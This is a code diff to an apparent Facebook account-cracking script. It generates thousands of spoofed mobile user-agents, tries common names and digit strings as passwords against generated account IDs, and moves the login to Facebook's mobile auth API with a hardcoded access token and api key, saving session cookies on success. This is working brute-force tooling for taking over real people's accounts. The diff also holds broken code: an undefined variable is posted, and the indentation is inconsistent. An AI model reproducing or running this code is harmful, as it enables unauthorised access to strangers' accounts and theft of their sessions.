@@ -109,8 +109,9 @@ loop = 0
 cp = []
 ok = []
 twf = []
-
 ugen = []
+ua = ["Davik/2.1.0 (Linux; U; Android 12.0.1; Infinix X676C Build/SP1A.210812.016) [FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]",]
+ua = ["Davik/2.1.0 (Linux; U; Android 9.0.0; SM-G975F Build/R16NW) [FBAN/FB4A;FBAV/230.0.0.42.121;FBBV/156478510;FBDM/{density=4.0,width=1440,height=3040};FBLC/en_US;FBRV/54010646;FBCR/Verizon;FBMF/SAMSUNG;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]",]
 for xd in range(5000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -178,6 +179,38 @@ for x in range(10):
     j=random.randrange(1, 9)
     k=random.randrange(1, 9)
     l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    
+for agent in range(random.randint(89999, 100000)):
+    a='Mozilla/5.0 (iPod/'
+    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
+    a1='; CPU iPhone OS'
+    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
+    n='like Mac OS X)'
+    c=random.randrange(7,12)
+    m='en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(100,999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/'
+    o=random.randrange(533,605)
+    p='1'
+    q=random.randrange(10,99)
+    r='(KHTML, like Gecko) Chrome/'
+    h=random.randrange(10,99)
+    i='0'
+    j=random.randrange(1000,9999)
+    k=random.randrange(10,99)
+    l='GSA/'
+    ll=random.randrange(155,159)
+    l1=random.randrange(1,9)
+    l2=random.randrange(111111111,999999999)
+    l3='Mobile/'
+    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
+    l5='Safari/'
+    s=random.randrange(535,605)
+    t=random.randrange(1,9)
+    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
+    ugen.append(fullagent)
     uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 def uaku():
     try:
@@ -358,7 +391,7 @@ def pass1():
         print('\033[1;93m─────────────────────────────────────────────────────')
         for love in user:
             uid = code+love
-            pwx = ['BANGLADESH','Bangladesh','bangladesh','I Love You',]
+            pwx = ['sadiya', 'hridoy', 'nusrat', 'fatema', 'mababa', 'sahin', 'sabbir', 'alamin', '405060', '708090', '112233', '445566']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;93m─────────────────────────────────────────────────────')
@@ -421,35 +454,43 @@ def freeq(uid,pwx,tl):
             session = requests.Session()
             pro = random.choice(ugen)
             free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "next":"https://m.basic.facebook.com/login/device-based/regular/login/?refsrc",
-            "flow":"login_no_pain",
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'm.facebook.com',
-            "method": 'GET',
-            "path": '/?tbua=1',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            "referer": 'https://m.facebook.com/',
-            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": '"Android"',
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro,}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            log_data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": "100049974613980",
+"password": "md123",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent':('Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]'),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'EXCELLENT',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
